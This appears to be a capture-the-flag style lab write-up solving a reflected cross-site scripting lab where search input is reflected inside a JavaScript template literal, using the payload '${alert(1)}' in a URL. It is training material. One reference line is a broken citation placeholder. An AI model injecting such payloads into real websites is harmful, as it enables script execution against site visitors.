## 21 - Reflected XSS into a template literal

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.

## Notes

- Search page Found
- Possibility to leave a comment on a post

## Resume

1. Capture a search request
2. Identify the JavaScript template string
3. Inject JavaScript expression inside the template literal
4. Trigger the XSS

## Solve

Search for a random string and inspect the response:

```html
<script>
    var message = `0 search results for 'pouet'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

The user input is reflected inside a JavaScript template string using backticks:

```javascript
``
```

Template literals support JavaScript expression interpolation using:

```javascript
${...}
```

Using this article:

- :contentReference[oaicite:0]{index=0}

Use the following payload:

```javascript
${alert(1)}
```

Final URL example:

```text
https://YOUR-LAB-ID.web-security-academy.net/?search=%24%7Balert(1)%7D
```

When rendered, the response becomes:

```html
<script>
    var message = `0 search results for '${alert(1)}'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

The JavaScript expression inside:

```javascript
${...}
```

is evaluated by the browser, which executes:

```javascript
alert(1)
```

This triggers the XSS and solves the lab.